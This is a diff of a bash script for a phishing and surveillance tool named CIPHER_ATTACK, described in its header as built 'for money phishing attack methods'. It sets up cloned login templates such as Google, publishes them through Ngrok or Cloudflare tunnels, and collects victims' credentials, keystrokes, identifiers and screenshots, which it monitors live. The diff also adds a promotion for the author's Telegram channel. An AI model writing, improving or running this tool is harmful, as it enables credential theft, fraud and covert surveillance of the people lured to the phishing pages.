@@ -1,14 +1,11 @@
 #!/bin/bash
 
 # ==============================================================================
-# Project: CIPHER_ATTACK - Advanced Phishing & Surveillance Tool
-# File: camphish20x.sh
-# Description: Main script for setting up phishing campaigns, managing tunnels,
-#              and collecting data. Includes advanced features like keylogging,
-#              screenshotting, dynamic session management, and robust error handling.
+# Project: CIPHER_ATTACK  tools 
+# Description: this is project build for money phishing attack methods 
 # ==============================================================================
 
-# --- Configuration & Global Variables ---
+# Configuration 
 BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 TEMPLATES_DIR="$BASE_DIR/templates"
 COLLECTED_DATA_BASE_DIR="$BASE_DIR/collected_data"
@@ -24,18 +21,18 @@ PHP_PID=""
 CURRENT_SESSION_DIR=""
 PHISHING_URL=""
 SELECTED_TEMPLATE_DIR=""
-COLLECTOR_PHP_COPY="" # Path to the session-specific collector.php copy
+COLLECTOR_PHP_COPY="" 
 
-# --- Color Codes ---
+# color 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
 BLUE='\033[0;34m'
 MAGENTA='\033[0;35m'
 CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+NC='\033[0m' 
 
-# --- Utility Functions ---
+
 
 # Function to display messages
 log_info() { echo -e "${CYAN}[*] $1${NC}"; }
@@ -70,7 +67,7 @@ check_dependencies() {
         log_error "Please install them using your package manager (e.g., sudo apt install ${missing_deps[*]})"
         exit 1
     fi
-    log_success "All core dependencies met."
+    log_success "All core dependencies installed."
 }
 
 # Function to install Ngrok
@@ -143,7 +140,7 @@ get_ngrok_token() {
 
 # Function to select a phishing template
 select_template() {
-    log_info "Available Phishing Templates:"
+    log_info "Available Phishing Templates. google is my best template:"
     local templates=()
     local i=1
     for d in "$TEMPLATES_DIR"/*/; do
@@ -171,7 +168,7 @@ select_template() {
     log_success "Selected template: ${templates[$((choice-1))]}"
 }
 
-# Function to create a unique session directory for collected data
+# Function to create session directory for collected data
 create_session_dir() {
     local timestamp=$(date +"%Y%m%d_%H%M%S")
     local random_suffix=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
@@ -184,17 +181,17 @@ create_session_dir() {
 # Function to configure collector.php for the current session
 configure_collector_php() {
     local template_collector_php="$SELECTED_TEMPLATE_DIR/collector.php"
-    COLLECTOR_PHP_COPY="$CURRENT_SESSION_DIR/collector.php" # Copy to session dir to modify
+    COLLECTOR_PHP_COPY="$CURRENT_SESSION_DIR/collector.php" 
 
     if [ ! -f "$template_collector_php" ]; then
         log_error "Collector.php not found in selected template: $template_collector_php"
         exit 1
     fi
 
-    # Copy the collector.php to the session directory
+    
     cp "$template_collector_php" "$COLLECTOR_PHP_COPY" || { log_error "Failed to copy collector.php to session directory."; exit 1; }
 
-    # Replace the placeholder with the actual session data path
+    
     sed -i "s|__COLLECTED_DATA_PATH__|$CURRENT_SESSION_DIR|g" "$COLLECTOR_PHP_COPY" || { log_error "Failed to configure collector.php."; exit 1; }
 
     log_success "Collector.php configured for current session."
@@ -203,18 +200,15 @@ configure_collector_php() {
 # Function to start PHP web server
 start_php_server() {
     log_info "Starting PHP web server on port $PHP_PORT..."
-    # PHP server needs to serve from the template directory
-    # But collector.php needs to be the one from the session folder.
-    # We will use a symlink or ensure the collector.php in the template uses the session one.
-    # A simpler approach: create a temporary directory for the session, copy template files and the configured collector.php there, and serve that.
+    
 
     local TEMP_SERVE_DIR="$CURRENT_SESSION_DIR/serve"
     mkdir -p "$TEMP_SERVE_DIR" || { log_error "Failed to create temporary serve directory."; exit 1; }
 
-    # Copy all template files to the temporary serve directory
+    
     cp -r "$SELECTED_TEMPLATE_DIR"/* "$TEMP_SERVE_DIR/" || { log_error "Failed to copy template files to serve directory."; exit 1; }
 
-    # Replace the template's collector.php with the session-specific configured one
+    # Replace the template's collector.php 
     cp "$COLLECTOR_PHP_COPY" "$TEMP_SERVE_DIR/collector.php" || { log_error "Failed to replace collector.php in serve directory."; exit 1; }
 
     php -S 127.0.0.1:$PHP_PORT -t "$TEMP_SERVE_DIR" > /dev/null 2>&1 &
@@ -243,7 +237,7 @@ start_ngrok_tunnel() {
     sleep 5 # Give Ngrok time to establish connection
 
     if ! ps -p "$NGROK_PID" > /dev/null; then
-        log_error "Ngrok failed to start. Check your Ngrok token or network."
+        log_error "Ngrok failed to start. Check your Ngrok token or chek your network."
         return 1
     fi
 
@@ -305,14 +299,14 @@ start_cloudflared_tunnel() {
     CLOUDFLARED_PID=$!
 
     local cloudflare_url=""
-    for i in {1..20}; do # Try for 20 seconds
+    for i in {1..20}; do 
         cloudflare_url=$(grep -E "https://[a-zA-Z0-9-]+\.trycloudflare\.com" "$cloudflared_log_file" | head -n 1 | awk '{print $NF}')
         if [ -n "$cloudflare_url" ]; then
             break
         fi
         sleep 1
     done
-    rm -f "$cloudflared_log_file" # Clean up log file
+    rm -f "$cloudflared_log_file" 
 
     if [ -z "$cloudflare_url" ]; then
         log_error "Failed to get Cloudflared public URL. Ensure cloudflared is installed and running correctly."
@@ -324,12 +318,11 @@ start_cloudflared_tunnel() {
     return 0
 }
 
-# Function to select tunneling service
 select_tunnel() {
     log_info "Select Tunneling Service:"
-    echo -e "${GREEN}[1]${NC} Ngrok (Recommended for external access)"
-    echo -e "${GREEN}[2]${NC} Cloudflare Tunnel (Recommended for external access, no token needed)"
-    echo -e "${GREEN}[3]${NC} LocalHost (For local testing only)"
+    echo -e "${GREEN}[1]${NC} Ngrok "
+    echo -e "${GREEN}[2]${NC} Cloudflare Tunnel ( no token needed)"
+    echo -e "${GREEN}[3]${NC} LocalHost (local testing only)"
     echo ""
     read -p "$(echo -e "${YELLOW}[?] Choose a tunneling option (number): ${NC}")" tunnel_choice
 
@@ -359,9 +352,9 @@ select_tunnel() {
 
 # Function to monitor collected data
 monitor_data() {
-    log_info "Monitoring collected data..."
+    log_info "collected data..."
     log_info "Phishing URL: ${GREEN}$PHISHING_URL${NC}"
-    log_info "Press ${RED}Ctrl+C${NC} to stop CamPhish20X."
+    log_info "Press ${RED}Ctrl+C${NC} to stop this phishing tool."
 
     local credentials_file="$CURRENT_SESSION_DIR/credentials.txt"
     local keylogs_file="$CURRENT_SESSION_DIR/keylogs.txt"
@@ -370,7 +363,7 @@ monitor_data() {
 
     echo ""
     echo -e "${MAGENTA}=======================================================${NC}"
-    echo -e "${MAGENTA}             CIPHER TOOL WORKING.             ${NC}"
+    echo -e "${MAGENTA}             CIPHER TOOL WORKING.for more information join my telegram channel             ${NC}"
     echo -e "${MAGENTA}=======================================================${NC}"
     echo ""
 
@@ -387,7 +380,7 @@ monitor_data() {
         tail -f "$keylogs_file" 2>/dev/null &
         tail -f "$identifiers_file" 2>/dev/null &
 
-        # Monitor screenshots directory (more complex, simple count for now)
+        # Monitor screenshots directory
         local current_screenshot_count="$initial_screenshot_count"
         while true; do
             local new_screenshot_count=$(ls -1 "$screenshots_dir" 2>/dev/null | wc -l)
@@ -395,14 +388,14 @@ monitor_data() {
                 log_success "New screenshot captured! Total: $new_screenshot_count"
                 current_screenshot_count="$new_screenshot_count"
             fi
-            sleep 5 # Check for new screenshots every 5 seconds
+            sleep 5 
         done
     ) &
     local MONITOR_PID=$!
-    wait "$MONITOR_PID" # Wait for the monitoring processes to finish (i.e., when main script exits)
+    wait "$MONITOR_PID" 
 }
 
-# Function for graceful shutdown
+
 cleanup() {
     log_warn "Stopping CIPHER_ATTACKIlNNG..."
     if [ -n "$NGROK_PID" ] && ps -p "$NGROK_PID" > /dev/null; then
@@ -417,17 +410,17 @@ cleanup() {
         kill "$PHP_PID"
         log_info "PHP web server stopped."
     fi
-    # Remove temporary serve directory if it exists
+    
     if [ -n "$CURRENT_SESSION_DIR" ] && [ -d "$CURRENT_SESSION_DIR/serve" ]; then
         rm -rf "$CURRENT_SESSION_DIR/serve"
         log_info "Cleaned up temporary serve directory."
     fi
-    log_success "CIPHER_ATTACK stopped gracefully. Collected data is in $CURRENT_SESSION_DIR"
+    log_success "CIPHER_ATTACK stopped. Collected data is in $CURRENT_SESSION_DIR"
     exit 0
 }
 
-# --- Main Logic ---
-trap cleanup SIGINT SIGTERM # Register cleanup function for Ctrl+C and termination signals
+
+trap cleanup SIGINT SIGTERM 
 
 clear
 display_banner
